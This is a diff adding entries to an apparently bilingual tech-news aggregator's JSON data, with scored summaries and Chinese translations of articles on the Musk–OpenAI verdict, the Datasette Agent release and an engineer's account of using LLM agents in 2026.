+            "type": "p",
+            "text": "Something went wrong, but don’t fret — let’s give it another shot."
+          },
+          {
+            "type": "p",
+            "text": "Some privacy related extensions may cause issues on x.com. Please disable them and try again."
+          }
+        ],
+        "translations": []
+      },
+      "fromDate": "2026-05-20"
+    },
+    {
+      "slug": "09b45e52228b1a4d",
+      "title": "Jury Rejects Elon Musk’s Claim Against Sam Altman in Unanimous Verdict",
+      "titleZh": "陪审团一致裁定：马斯克对OpenAI和奥特曼的诉讼已过诉讼时效",
+      "link": "https://www.nytimes.com/live/2026/05/18/technology/openai-trial-verdict-altman-musk?unlocked_article_code=1.jVA.Cc2V.IwYuu2r4SJfQ",
+      "sourceName": "daringfireball.net",
+      "sourceUrl": "https://daringfireball.net",
+      "pubDate": "2026-05-18T17:53:33.000Z",
+      "category": "ai-ml",
+      "keywords": [
+        "OpenAI",
+        "Elon Musk",
+        "lawsuit",
+        "AI regulation"
+      ],
+      "score": {
+        "relevance": 9,
+        "quality": 7,
+        "timeliness": 10,
+        "total": 26
+      },
+      "summary": "九人陪审团裁定，埃隆·马斯克在2024年夏季起诉OpenAI及其CEO萨姆·奥特曼的诉讼已超过三年诉讼时效。法院认定，马斯克早在2021年就已知晓其投诉中指控的行为，因此不具备起诉资格。这一 unanimous verdict 标志着这起备受关注的AI伦理与法律争议案以程序性驳回告终。",
+      "summaryEn": "A nine-person jury unanimously ruled that Elon Musk's lawsuit against OpenAI and Sam Altman was filed after the three-year statute of limitations expired. The court determined that Musk had been aware of the alleged misconduct as far back as 2021, making his 2024 suit procedurally invalid. This verdict concludes a high-profile legal battle over AI development ethics with a procedural dismissal.",
+      "reason": "此案揭示了科技巨头在AI治理中的法律边界问题，尤其凸显了诉讼时效对创新企业合规行为的潜在制约作用。",
+      "fullTextStatus": "failed",
+      "fullText": null,
+      "fromDate": "2026-05-19"
+    },
+    {
+      "slug": "1116f836bd5797c6",
+      "title": "Datasette Agent",
+      "titleZh": "Datasette Agent：Datasette首个可扩展AI助手发布",
+      "link": "https://simonwillison.net/2026/May/21/datasette-agent/#atom-everything",
+      "sourceName": "simonwillison.net",
+      "sourceUrl": "https://simonwillison.net",
+      "pubDate": "2026-05-21T19:52:19.000Z",
+      "category": "ai-ml",
+      "keywords": [
+        "Datasette Agent",
+        "AI assistant",
+        "LLM"
+      ],
+      "score": {
+        "relevance": 9,
+        "quality": 8,
+        "timeliness": 8,
+        "total": 25
+      },
+      "summary": "Simon Willison宣布推出Datasette Agent，这是Datasette的首个可扩展AI助手，整合了LLM Python库（开发超三年）与Datasette功能。它提供交互式对话接口，标志着两者技术融合的关键里程碑。",
+      "summaryEn": "Simon Willison unveiled Datasette Agent, the first extensible AI assistant for Datasette, combining his LLM Python library (developed over three years) with Datasette's capabilities. It introduces a conversational interface, marking a pivotal integration of both technologies.",
+      "reason": "展示了开源工具链如何结合AI助手能力，为开发者提供高效数据交互新范式。",
+      "fullTextStatus": "ok",
+      "fullText": {
+        "byline": "Simon Willison",
+        "siteName": "Simon Willison’s Weblog",
+        "partial": false,
+        "blocks": [
+          {
+            "type": "p",
+            "text": "21st May 2026"
+          },
+          {
+            "type": "p",
+            "text": "We just announced the first release of Datasette Agent, a new extensible AI assistant for Datasette. I’ve been working on my LLM Python library for just over three years now, and Datasette Agent represents the moment that LLM and Datasette finally come together. I’m really excited about it!"
+          },
+          {
+            "type": "p",
+            "text": "Datasette Agent provides a conversational interface for asking questions of the data you have stored in Datasette. Add the datasette-agent-charts plugin and it can generate charts of your data as well."
+          },
+          {
+            "type": "h3",
+            "text": "The demo"
+          },
+          {
+            "type": "p",
+            "text": "The announcement post (on the new Datasette project blog) includes this demo video:"
+          },
+          {
+            "type": "p",
+            "text": "I recorded the video against the new agent.datasette.io live demo instance, which runs Datasette Agent against example databases including the classic global-power-plants by WRI, and a copy of the Datasette backup of my blog."
+          },
+          {
+            "type": "p",
+            "text": "The live demo runs on Gemini 3.1 Flash-Lite—it’s cheap, fast and has no trouble writing SQLite queries."
+          },
+          {
+            "type": "p",
+            "text": "A question I asked in the demo was:"
+          },
+          {
+            "type": "quote",
+            "text": "when did Simon most recently see a pelican?"
+          },
+          {
+            "type": "p",
+            "text": "Which ran this SQL query:"
+          },
+          {
+            "type": "code",
+            "text": "SELECT\n  title, commentary, created\nFROM\n  blog_beat\nWHERE\n  beat_type = 'sighting'\n  AND (title LIKE '%pelican%' OR commentary LIKE '%pelican%')\nORDER BY\n  created DESC\nLIMIT\n  5"
+          },
+          {
+            "type": "p",
+            "text": "And replied:"
+          },
+          {
+            "type": "quote",
+            "text": "The most recent sighting of a pelican by Simon was recorded on May 20, 2026.\nThe observation included a California Brown Pelican, along with a Common Loon, Canada Goose, Striped Shore Crab, and a California Sea Lion."
+          },
+          {
+            "type": "p",
+            "text": "Here’s that sighting on my blog, and the Markdown export of the full conversation transcript."
+          },
+          {
+            "type": "h3",
+            "text": "The plugins"
+          },
+          {
+            "type": "p",
+            "text": "My favorite feature of Datasette Agent is that, like the rest of Datasette, it’s extensible using plugins."
+          },
+          {
+            "type": "p",
+            "text": "We’ve shipped three plugins so far:"
+          },
+          {
+            "type": "li",
+            "text": "datasette-agent-charts, shown in the video, adds charts to Datasette Agent, powered by Observable Plot."
+          },
+          {
+            "type": "li",
+            "text": "datasette-agent-openai-imagegen adds an image generation tool to Datasette Agent using ChatGPT Images 2.0."
+          },
+          {
+            "type": "li",
+            "text": "datasette-agent-sprites provides tools for executing code in a Fly Sprites persistent sandbox."
+          },
+          {
+            "type": "p",
+            "text": "Building plugins is really fun. I have a bunch more prototypes that aren’t quite alpha-quality yet."
+          },
+          {
+            "type": "p",
+            "text": "Claude Code and OpenAI Codex are both proving excellent at writing plugins—just point them at a checkout of the datasette-agent repo for reference and tell them what you want to build!"
+          },
+          {
+            "type": "h3",
+            "text": "Running it against local models"
+          },
+          {
+            "type": "p",
+            "text": "I’ve also been having fun running the new plugin against local models. Here’s a uv one-liner to run the plugin against gemma-4-26b-a4b in LM Studio on a Mac:"
+          },
+          {
+            "type": "code",
+            "text": "uvx --prerelease=allow \\\n  --with datasette-agent --with llm-lmstudio \\\n  datasette --internal internal.db --root \\\n  -s plugins.datasette-llm.default_model lmstudio/google/gemma-4-26b-a4b \\\n  data.db"
+          },
+          {
+            "type": "p",
+            "text": "Datasette Agent needs reliable tool calls and the ability for a model to produce SQL queries that run against SQLite. The open weight models released in the past six months are increasingly able to handle that."
+          },
+          {
+            "type": "h3",
+            "text": "What’s next"
+          },
+          {
+            "type": "p",
+            "text": "Datasette Agent opens up so many opportunities for the LLM and Datasette ecosystem in general."
+          },
+          {
+            "type": "p",
+            "text": "It’s already informed the major LLM 0.32a0 refactor which I’m nearly ready to roll into a stable release, maybe with some additional “LLM agent” abstractions extracte from Datasette Agent itself."
+          },
+          {
+            "type": "p",
+            "text": "I’ve been exploring my own take on the Claude Artifacts, which is shaping up nicely as a plugin."
+          },
+          {
+            "type": "p",
+            "text": "I’m excited to use Datasette Agent to build my own Claw—a personal AI assistant built around data imported from different parts of my digital life, which is a neat excuse to revisit my older Dogsheep family of tools."
+          },
+          {
+            "type": "p",
+            "text": "We’ll also be rolling out Datasette Agent for users of Datasette Cloud."
+          },
+          {
+            "type": "p",
+            "text": "Join our #datasette-agent Discord channel if you’d like to talk about the project."
+          }
+        ],
+        "translations": [
+          "2026年5月21日",
+          "我们刚刚发布了 Datasette Agent 的首个版本，这是一款专为 Datasette 设计的新型可扩展 AI 助手。在开发我的 LLM Python 库近三年后，Datasette Agent 标志着 LLM 与 Datasette 终于完美结合。我对此非常兴奋！",
+          "Datasette Agent 提供了一个对话式界面，可针对存储在 Datasette 中的数据提问。添加 datasette-agent-charts 插件后，它还能生成数据图表。",
+          "演示视频",
+          "公告文章（发布在新版 Datasette 项目博客）包含这段演示视频：",
+          "我在新的 agent.datasette.io 实时演示实例上录制了视频，该实例运行 Datasette Agent 并处理示例数据库，包括 WRI 的经典全球发电厂数据集，以及我的博客备份的 Datasette 副本。",
+          "实时演示基于 Gemini 3.1 Flash-Lite——成本低、速度快，且能轻松编写 SQLite 查询语句。",
+          "演示中我问的问题是：",
+          "Simon 最近何时见过一只鹈鹕？",
+          "它执行的 SQL 查询如下：",
+          "SELECT\n  title, commentary, created\nFROM\n  blog_beat\nWHERE\n  beat_type = 'sighting'\n  AND (title LIKE '%pelican%' OR commentary LIKE '%pelican%')\nORDER BY\n  created DESC\nLIMIT\n  5",
+          "并回复：",
+          "Simon 记录的最新鹈鹕目击事件发生在 2026 年 5 月 20 日。观测内容包括加州棕鹈鹕、普通潜鸟、加拿大雁、条纹潮蟹和加州海狮。",
+          "这是我在博客上的相关记录，以及完整对话记录的 Markdown 导出文件。",
+          "插件功能",
+          "我最喜欢 Datasette Agent 的特性是，像 Datasette 的其他部分一样，它支持通过插件扩展功能。",
+          "目前已发布三个插件：",
+          "视频中展示的 datasette-agent-charts 插件借助 Observable Plot 为 Datasette Agent 添加了图表功能。",
+          "datasette-agent-openai-imagegen 插件使用 ChatGPT Images 2.0 为 Datasette Agent 增加了图像生成工具。",
+          "datasette-agent-sprites 插件提供了在 Fly Sprites 持久沙箱中执行代码的工具。",
+          "开发插件真的很有趣。我还有许多尚未达到 alpha 质量的更多原型。",
+          "Claude Code 和 OpenAI Codex 在编写插件方面表现优异——只需让它们参考 datasette-agent 仓库的代码库，说明你想构建的内容即可！",
+          "本地模型运行",
+          "我还乐此不疲地在本地模型上测试新插件。以下是在 Mac 上使用 LM Studio 运行 gemma-4-26b-a4b 模型的 uv 单行命令：",
+          "uvx --prerelease=allow \\\n  --with datasette-agent --with llm-lmstudio \\\n  datasette --internal internal.db --root \\\n  -s plugins.datasette-llm.default_model lmstudio/google/gemma-4-26b-a4b \\\n  data.db",
+          "Datasette Agent 需要可靠的工具调用能力，以及模型生成可运行于 SQLite 的 SQL 查询的能力。过去六个月发布的开源权重模型越来越能满足这些需求。",
+          "后续计划",
+          "Datasette Agent 为整个 LLM 和 Datasette 生态系统打开了无数可能性。",
+          "它已推动了我对 LLM 0.32a0 的重大重构，即将合并到稳定版本中，可能还会从 Datasette Agent 本身提取一些额外的“LLM 代理”抽象层。",
+          "我正在探索自己对 Claude Artifacts 的实现方案，这正在逐步完善为一个插件。",
+          "我很期待用 Datasette Agent 构建自己的 Claw——一个围绕我从数字生活各处导入数据打造的个人 AI 助手，这正是一个重温旧版 Dogsheep 系列工具的绝佳理由。",
+          "我们还将为 Datasette Cloud 用户推出 Datasette Agent。",
+          "如果想讨论该项目，请加入我们的 #datasette-agent Discord 频道。"
+        ]
+      },
+      "fromDate": "2026-05-23"
+    },
+    {
+      "slug": "45e571f6eda50357",
+      "title": "How I use LLMs as a staff engineer in 2026",
+      "titleZh": "2026年我作为资深工程师如何使用LLM",
+      "link": "https://seangoedecke.com/how-i-use-llms-in-2026/",
+      "sourceName": "seangoedecke.com",
+      "sourceUrl": "https://seangoedecke.com",
+      "pubDate": "2026-05-17T00:00:00.000Z",
+      "category": "ai-ml",
+      "keywords": [
+        "LLM",
+        "staff engineer",
+        "Copilot"
+      ],
+      "score": {
+        "relevance": 9,
+        "quality": 8,
+        "timeliness": 8,
+        "total": 25
+      },
+      "summary": "文章探讨了资深工程师在2026年如何利用大型语言模型（LLMs）提升工作效率。作者主要使用Copilot进行智能代码补全，在熟悉度低的领域实施经过专家审核的小型战术性修改，并大量编写一次性研究代码。此外，他频繁向LLM提问以快速学习新主题如Unity游戏引擎，并将LLM作为最后的调试工具。作者强调所有AI生成内容均需人工复核，尤其涉及关键系统时。其核心观点是：LLM应被视为增强人类能力的工具而非替代者，合理使用可显著加速开发流程。",
+      "summaryEn": "The article outlines how a senior engineer leveraged large language models (LLMs) in 2026 to enhance productivity. Key uses included smart code autocompletion via Copilot, implementing minor tactical changes in unfamiliar domains (always reviewed by SMEs), and writing disposable research scripts. The author also relied on LLMs for rapid learning of new topics like the Unity engine and as a last-resort debugging aid. All AI-generated outputs were subject to human review, especially for critical systems. The central argument is that LLMs serve best as collaborative tools—amplifying human capability rather than replacing it—when used judiciously with appropriate safeguards.",
+      "reason": "它为技术领导者提供了真实、可操作的AI集成策略，展示了如何在保持质量控制的前提下高效利用LLM加速工程实践。",
+      "fullTextStatus": "ok",
+      "fullText": {
+        "partial": false,
+        "blocks": [
+          {
+            "type": "p",
+            "text": "A bit over a year ago I wrote How I use LLMs as a staff engineer. Here’s a brief summary of what I used AI for last year:"
+          },
+          {
+            "type": "li",
+            "text": "Smart autocomplete with Copilot"
+          },
+          {
+            "type": "li",
+            "text": "Short tactical changes in areas I don’t know well (always reviewed by a SME)"
+          },
+          {
+            "type": "li",
+            "text": "Writing lots of use-once-and-throwaway research code"
+          },
+          {
+            "type": "li",
+            "text": "Asking lots of questions to learn about new topics (e.g. the Unity game engine)"
+          },
+          {
+            "type": "li",
+            "text": "Last-resort bugfixes, just in case it can figure it out immediately"
+          },
+          {
+            "type": "li",
+            "text": "Big-picture proofreading for long-form English communication"
+          },
+          {
+            "type": "p",
+            "text": "Here are some tasks I explicitly didn’t use AI for last year:"
+          },
+          {
+            "type": "li",
+            "text": "Writing whole PRs for me in areas I’m familiar with"
+          },
+          {
+            "type": "li",
+            "text": "Writing ADRs or other technical communications"
+          },
+          {
+            "type": "li",
+            "text": "Research in large codebases and finding out how things are done"
+          },
+          {
+            "type": "p",
+            "text": "February 2025 was a long time ago. Back then the best model was the first reasoning model, OpenAI’s o1. Agents sort of worked, but would often get stuck or thrown off by compaction. What’s changed since then?"
+          },
+          {
+            "type": "h3",
+            "text": "Agents are good now"
+          },
+          {
+            "type": "p",
+            "text": "The biggest change is that I now use LLMs to produce entire PRs in areas I’m familiar with. A year ago I would very occasionally ask an agent to make changes to a single file if it was a simple change I couldn’t be bothered typing out. Sometimes I would copy a function I wrote into a LLM chat window for feedback. But now I start every single change by asking an agent to solve the problem, and usually push the PR after a single editing pass."
+          },
+          {
+            "type": "p",
+            "text": "In late 2025 I used a lot of open VSCode windows. In early 2026, that changed to terminal tabs with the Copilot CLI, particularly when I needed to make changes across multiple repos at the same time. Now I use the GitHub Copilot app a lot (tens of sessions per day)."
+          },
+          {
+            "type": "p",
+            "text": "This reflects a shift from having to line-edit the agent basically as it went to only doing an editing pass right at the end. Early agents would go wrong a lot and not be able to recover, so it was valuable to keep an eye on their thought processes and step in to pause them and set them right. In my experience, current agents move too fast to do this, and recover their own mistakes most of the time anyway."
+          },
+          {
+            "type": "p",
+            "text": "Sometimes I don’t even need to make edits and I can just push the change as-is, though this is rare: if nothing else, I typically go through and remove some of the over-commenting and other LLM-isms."
+          },
+          {
+            "type": "p",
+            "text": "I do a lot of skimming through and evaluating agent changes. Most of the time I reject them entirely, just based on “eh, that’s not what I was thinking”. On average it takes me about thirty seconds to make this initial assessment. If the change looks alright after that, I’ll dig in and do a proper review to make sure I understand it and it’s doing the right thing. For difficult tasks, I’ll often reject five or six (or more!) agent attempts before accepting one as good enough to work with, or giving up and making the change by hand."
+          },
+          {
+            "type": "h3",
+            "text": "Investigating bugs"
+          },
+          {
+            "type": "p",
+            "text": "I rely on LLMs even more for bug-hunting than I do for making changes. In 2025, I used to throw the occasional bug at a LLM, just in case it was able to rapidly come up with an explanation. Now I throw every bug at a LLM (typically by opening a new agent session and pasting in the bug report), because it’s able to correctly diagnose 80% of issues on its own. Current agents are really good at chasing down bugs, particularly when you give them a vantage point across multiple repositories."
+          },
+          {
+            "type": "p",
+            "text": "I’m still better at it. Just last week I had a tricky bug that took about fourteen agent sessions before one finally figured it out. What was I doing in between and around those sessions?"
+          },
+          {
+            "type": "li",
+            "text": "Digging up extra context on the bug (from logs, Slack, etc) and reporting it to the agents"
+          },
+          {
+            "type": "li",
+            "text": "Building my own mental model of the problem, of course"
+          },
+          {
+            "type": "li",
+            "text": "Setting up my own reproduction of the bug (in parallel with the agents’ efforts)"
+          },
+          {
+            "type": "li",
+            "text": "Responding to agent sessions with “no, your theory can’t be right because of X” (or just killing and restarting the session with that extra hint)"
+          },
+          {
+            "type": "p",
+            "text": "Ultimately an agent was the one to catch the bug. But I still count it as my find, because by that point I had narrowed the search space tightly enough that agent session #14 had a significantly easier problem to solve than agent session #1. In other words, human expertise still matters a lot for investigating bugs."
+          },
+          {
+            "type": "h3",
+            "text": "Writing"
+          },
+          {
+            "type": "p",
+            "text": "I almost always write my own PR descriptions, since LLMs over-communicate and are bad at expressing the “core idea” behind a change. Writing the PR description by hand also signals to reviewers that I’ve reviewed the change myself, and I’m not asking them to be the first human to read the diff. The only time when I don’t write the PR description is when the change is trivial and the agent-generated description is one sentence. At that point I just leave it alone."
+          },
+          {
+            "type": "p",
+            "text": "I still don’t use LLMs to write Slack messages, ADRs, issues and so forth. I believe I have a better sense of what’s important to communicate, and I want to signal that there’s a human being thinking about the content."
+          },
+          {
+            "type": "p",
+            "text": "I still never use LLMs to write blog posts, though I do run each draft post through a LLM for feedback. OpenAI models used to be terrible at this and have only very recently gotten acceptable with GPT-5.5. Both OpenAI and Anthropic models still try to water down my arguments, but I’ve accepted that as part of the LLM “house style” and just ignore that part of the feedback."
+          },
+          {
+            "type": "h3",
+            "text": "Testing and setup"
+          },
+          {
+            "type": "p",
+            "text": "Another thing I do now is try and push as much testing and setup work as possible onto the agents. In 2025, I used to sometimes ask a LLM to produce a test script of curl commands that I could run against my dev server. In 2026, I just ask an agent to go and test my change, then read the log of what it did."
+          },
+          {
+            "type": "p",
+            "text": "I don’t test UI work like this, partly because it’s more fiddly and partly because I don’t trust agents to be sensitive to the subtle look-and-feel aspects of a change."
+          },
+          {
+            "type": "p",
+            "text": "Agents will write expansive unit tests without having to be told, but I do sometimes ask them to put together broader integration tests for a change. In general I now consider test code to be cheap: if I’m wondering whether a test would be useful, I just add it (so long as I know it won’t be flaky). Of course LLMs sometimes produce strange and unsatisfying test code - I do read it to catch obvious blunders - but I review it with a more generous eye than my actual production code."
+          },
+          {
+            "type": "p",
+            "text": "I’ll also task an agent with annoying local setup tasks that involve config wrangling on my machine. For instance, if my nvm installation is not switching my Node version correctly, I will often open a Copilot CLI agent and ask it to figure it out. This is a more-or-less direct replacement for Googling the problem, and is much quicker since the agent can run the trivial bash commands to diagnose and fix the problem itself."
+          },
+          {
+            "type": "h3",
+            "text": "Summary"
+          },
+          {
+            "type": "p",
+            "text": "The main thing that’s changed in the last fifteen months is that agents are really good now. They’ve gone from something I used occasionally and suspiciously to something I use constantly and with light supervision."
+          },
+          {
+            "type": "p",
+            "text": "The core of my job is still the same: shipping projects, exercising my judgement, influencing tech company politics. But I now have a much wider net for small pieces of work that I’m willing to take on, which includes basically anything I can hand off to an agent and expect it to get more or less right."
+          },
+          {
+            "type": "p",
+            "text": "I used to spend a lot of time putting work off, either by delegating it or just saying “sorry, I don’t have time to do that now”. Now I get to say “yes” a lot more (at least when it comes to minor low-risk tweaks)1."
+          },
+          {
+            "type": "p",
+            "text": "Overall, here’s what I now use AI for:"
+          },
+          {
+            "type": "li",
+            "text": "Writing (or drafting, depending on complexity) every code change I make"
+          },
+          {
+            "type": "li",
+            "text": "Investigating and fixing bugs, either autonomously for most bugs or with my close involvement for trickier ones"
+          },
+          {
+            "type": "li",
+            "text": "Research in large codebases, since current agents are now good enough to give the right answer almost all the time (and when they’re wrong, it’s clear from reading the explanation that they’ve missed something)"
+          },
+          {
+            "type": "li",
+            "text": "Manual testing and local-machine setup or troubleshooting"
+          },
+          {
+            "type": "li",
+            "text": "I still use AI for asking lots of questions to learn about topics, and for proofreading"
+          },
+          {
+            "type": "p",
+            "text": "Here’s what I still don’t use AI for:"
+          },
+          {
+            "type": "li",
+            "text": "Writing any kind of public communication for me (PR descriptions, ADRs, messages) with the exception of trivial two-line PRs"
+          },
+          {
+            "type": "li",
+            "text": "Writing code that I don’t carefully review"
+          },
+          {
+            "type": "li",
+            "text": "Testing any kind of UI"
+          },
+          {
+            "type": "p",
+            "text": "In my view, the current core AI skill is shifting as much work onto AI agents as possible, without going too far. Many people are under-utilizing agents: not allowing them to investigate bugs or test their changes, or not throwing enough simple tasks at them. Other people are over-utilizing them: using them to write messages that ought to be hand-written, or trusting them to make sweeping changes that need careful human review. Since my last post, the balance has tilted more towards the agents, but finding the balance remains as tricky as ever."
+          },
+          {
+            "type": "li",
+            "text": "For once I can actually give an example, since it’s in a public repository. Someone internal wanted to be able to use the actions/ai-inference GitHub Action with Copilot-backed inference (for various reasons), and instead of saying “sorry, I don’t have time to get to it”, I was able to throw it at an agent. If a human had to do this, the output would likely have been better, but it wouldn’t have gotten done for weeks (if at all).\n↩"
+          },
+          {
+            "type": "p",
+            "text": "If you liked this post, consider subscribing to email updates about my new posts, or sharing it on Hacker News."
+          },
+          {
+            "type": "p",
+            "text": "Here's a preview of a related post that shares tags with this one."
+          },
+          {
+            "type": "quote",
+            "text": "How I use LLMs to learn new subjectsIf you want to learn about a new subject in 2025, one of the best ways to do it is to ask a strong language model.The reason this method is so good is not that LLMs are smarter than your average Google search result, but that you can ask infinite follow-up questions. I often start by asking a general question (like “how does Kafka work”) and then digging in with many, many follow-up questions: both specific questions, like “what happens if a broker crashes”, and confirmation questions, like “it sounds like Kafka relies on clients to track which events are processed, is that right?”. I think this is a pretty intuitive way to learn something from a LLM, because it’s essentially treating it like a well-informed friend.Continue reading..."
+          }
+        ],
+        "translations": [
+          "大约一年前，我写了《作为高级工程师，我是如何使用大语言模型的》。以下是去年我为 AI 所做的事情的简要总结：",
+          "使用 Copilot 进行智能自动补全",
+          "在我不太熟悉的领域进行一些短期的战术性修改（始终由相关领域的专家审核）",
+          "编写大量一次性使用的研究代码",
+          "向 AI 提出很多问题以了解新主题（例如 Unity 游戏引擎）",
+          "最后的 bug 修复手段——万一它能立刻解决呢？",
+          "对长篇英文内容进行整体校对",
+          "以下是我去年明确没有使用 AI 的任务：",
+          "在我熟悉的领域为我撰写完整的 PR",
+          "撰写 ADR 或其他技术文档",
+          "在大规模代码库中进行研究并查明实现方式",
+          "2025 年 2 月仿佛已是遥远的过去。那时最好的模型还是 OpenAI 的首个推理模型 o1，智能体（agent）勉强能用，但经常陷入僵局或被上下文压缩干扰。自那以后，究竟发生了什么变化？",
+          "现在的智能体已经非常出色了",
+          "最大的变化在于，我现在会利用大语言模型生成整个 PR，尤其是在我熟悉的领域。一年前，我偶尔会让智能体修改单个文件中的简单变更，如果懒得手动输入的话。有时我会把写好的函数复制到 LLM 聊天窗口中寻求反馈。而现在，我每次改动都从让智能体解决问题开始，通常只需一次编辑就能直接推送 PR。",
+          "2025 年底，我频繁打开多个 VSCode 窗口；到了 2026 年初，则改用终端标签页配合 Copilot CLI，特别是在需要同时跨多个仓库进行修改时。如今，我大量使用 GitHub Copilot 应用（每天几十次会话）。",
+          "这反映出一种转变：不再需要在智能体运行过程中实时逐行编辑，而是只在最后进行一次整体编辑。早期的智能体容易出错且难以恢复，因此有必要密切关注其思考过程，及时干预、暂停或纠正。而据我的经验，现在的智能体速度太快，大多数错误都能自行修正，反而难以介入。",
+          "有时候我甚至不需要做任何修改，可以直接推送变更——虽然这种情况很少见：无论如何，我通常会顺手删掉那些过度注释和其他典型的“LLM 风格”的内容。",
+          "我经常快速浏览并评估智能体提出的修改。大多数时候，仅凭“嗯，这不是我想要的”就全盘拒绝。平均而言，初步判断只需三十秒左右。如果看起来还不错，我再深入审查，确保自己理解其逻辑，并确认它确实在做正确的事。对于复杂任务，我常常要拒绝五六次（甚至更多！）智能体的尝试，才会接受一个足够好的版本，或者干脆放弃，自己动手实现。",
+          "调查 bug",
+          "我在排查 bug 方面对大语言模型的依赖甚至超过了在代码修改上的依赖。2025 年时，我只是偶尔会把 bug 抛给 LLM，碰碰运气看能否快速解释清楚。现在，我会把所有 bug 都交给 LLM（通常是新建一个智能体会话，粘贴 bug 报告），因为它能独立诊断出约 80% 的问题。当前的智能体在追查 bug 方面表现尤为出色，尤其是当你能提供跨多个仓库的视角时。",
+          "我依然更擅长处理这类问题。就在上周，我遇到一个棘手的 bug，前前后后用了大约十四次智能体会话，才终于让它搞明白。在这期间和之间，我到底做了些什么？",
+          "从日志、Slack 等渠道挖掘更多上下文信息，并将问题报告给智能体",
+          "当然，我也会构建自己对问题的认知模型",
+          "同时，我会尝试复现该 bug（与智能体的排查工作并行进行）",
+          "在智能体会话中回应“不，你的假设肯定不对，因为 X”（或者直接终止并重启会话，附带这条额外线索）",
+          "最终是某个智能体发现了这个 bug。但我仍将其视为我的发现，因为到那时，我已经足够缩小了搜索范围，使得第 14 次智能体会话所面对的问题，远比第一次会话简单得多。换句话说，人类的专业知识在 bug 排查中依然至关重要",
+          "编写文档",
+          "我几乎总是自己撰写 PR 描述，因为 LLM 往往过度表达，难以准确传达改动背后的核心思想。手动撰写 PR 描述也能向评审者表明我已审阅过代码变更，而不是让他们成为第一个阅读 diff 的人类。只有在改动微不足道且智能体生成的描述仅一句话时，我才不会重写——这时我通常就保留原样",
+          "我仍然不用 LLM 来写 Slack 消息、ADR、issue 等。我认为自己对哪些内容重要有更好的判断力，而且我希望传达出这是经过人类思考的内容",
+          "尽管我会让每个草稿博客都经过 LLM 反馈，但我从不直接用 LLM 写博客文章。过去 OpenAI 的模型在这方面表现极差，直到最近 GPT-5.5 才达到可用水平。无论是 OpenAI 还是 Anthropic 的模型，仍倾向于弱化我的论点，但我已接受这属于 LLM 的“写作风格”，并选择忽略这部分反馈",
+          "测试与配置",
+          "现在我还尽量把尽可能多的测试和配置工作交给智能体完成。2025 年时，我有时会要求 LLM 生成一组 curl 命令脚本供我在开发服务器上运行；而到了 2026 年，我只需让智能体去测试我的变更，然后读取它执行过程中产生的日志即可",
+          "我不这样处理 UI 相关的测试，部分原因是这类任务更繁琐，另一部分原因是我不信任智能体能敏锐察觉改动带来的微妙视觉与交互体验变化",
+          "智能体会主动编写详尽的单元测试，无需我特别指示。但有时我也会请它们为某项变更搭建更广泛的集成测试。如今我认为测试代码成本很低：只要不确定是否有用，我就直接加上（前提是知道它不会不稳定）。当然，LLM 有时也会写出奇怪或不够理想的测试代码——我会阅读以捕捉明显错误，但对它们的审查比对生产代码更宽容",
+          "我还会让智能体处理那些令人厌烦的本地配置任务，比如在我机器上调整 nvm 导致 Node 版本切换失败时，我常会打开 Copilot CLI 智能体让它自己搞定。这基本上是对“上网搜索解决方案”的直接替代，而且更快，因为智能体能自行运行简单的 bash 命令来诊断并修复问题",
+          "总结",
+          "过去十五个月最大的变化在于：智能体现在真的很强了。它们已经从我曾偶尔怀疑使用的工具，变成了我现在频繁使用、仅需轻度监督就能高效工作的伙伴",
+          "我的工作核心依然没变：交付项目、做出判断、影响科技公司里的技术决策。但现在，我承接小型工作的范围更广了，只要我能放心交给 AI 代理处理并期望它大致做对，基本上什么活儿我都接。",
+          "过去我经常把事情推掉，要么是转手给别人，要么就是干脆说“抱歉，我现在没时间做这个”。现在，我更多时候会说“行”（至少对于风险低的小改动是这样）。",
+          "总体来看，我现在使用 AI 的用途如下：",
+          "撰写或起草我所做的每一处代码变更。",
+          "自主排查和修复大多数 bug，或对较复杂的 bug 在密切参与下完成。",
+          "在大规模代码库中进行研究——因为现在的 AI 代理已经足够可靠，几乎总能给出正确答案（而当他们出错时，通过阅读解释就能明显看出他们遗漏了什么）。",
+          "手动测试以及本地机器的设置与故障排除。",
+          "我仍然用 AI 来提出大量问题以学习新领域，也用于校对。",
+          "以下是我目前仍不使用 AI 的场景：",
+          "撰写任何形式的对外公开沟通内容（如 PR 描述、ADR、消息），除非是微不足道的两行 PR。",
+          "编写未经仔细审查的代码。",
+          "进行任何形式的 UI 测试。",
+          "在我看来，当前 AI 的核心能力正朝着尽可能多地将工作交给 AI 代理的方向发展，但又不至于越界。很多人其实没有充分利用代理：不让它们去查 bug 或验证修改，或者没有给它们分配足够多的简单任务。另一些人则过度依赖：让他们写本应由人撰写的消息，或信任他们做出需要细致人工审核的大规模改动。自从我上次发文以来，这种平衡更偏向于代理一方，但找到合适的平衡点依然像以往一样棘手。",
+          "这次我可以举个具体例子，因为它出现在公开仓库里。内部有人希望能在 actions/ai-inference GitHub Action 中使用 Copilot 支持的推理功能（出于各种原因），与其说我“抱歉，我没时间处理”，不如说我直接扔给了 AI 代理。如果是人类来做，结果可能更好，但很可能要拖上几周（甚至根本完不成）。",
+          "如果你喜欢这篇文章，欢迎订阅邮件更新以获取我的新帖通知，或在 Hacker News 上分享它。",
+          "这里有一篇相关帖子，标签与此文部分重叠。",
+          "我是如何用大语言模型学习新领域的  \n如果你想在 2025 年学习一个新领域，最好的方法之一就是向一个强大的语言模型提问。  \n这种方法之所以有效，并不是因为大语言模型比普通谷歌搜索结果更聪明，而是因为你能够提出无限个后续问题。我通常先问一个宽泛的问题（比如“Kafka 是怎么工作的？”），然后围绕它提出大量后续问题：既有具体问题，比如“如果 broker 崩溃了会怎样？”，也有确认性问题，比如“听起来 Kafka 依赖客户端来跟踪哪些事件已被处理，对吗？”。我认为这是一种相当直观的学习方式，因为它本质上是在把 LLM 当作一个知识渊博的朋友来对待。继续阅读……"
+        ]
+      },
+      "fromDate": "2026-05-18"
+    },
+    {
+      "slug": "6663e341ba956ba7",
+      "title": "What will better AI mean?",
+      "titleZh": "更好的 AI 意味着什么？",
+      "link": "https://geohot.github.io//blog/jekyll/update/2026/05/20/what-will-better-mean.html",
+      "sourceName": "geohot.github.io",
+      "sourceUrl": "https://geohot.github.io",
+      "pubDate": "2026-05-20T07:00:00.000Z",
+      "category": "ai-ml",
+      "keywords": [
+        "AI",
+        "Claude",
+        "Mythos"
+      ],
+      "score": {
+        "relevance": 9,
+        "quality": 7,
+        "timeliness": 9,
+        "total": 25
+      },
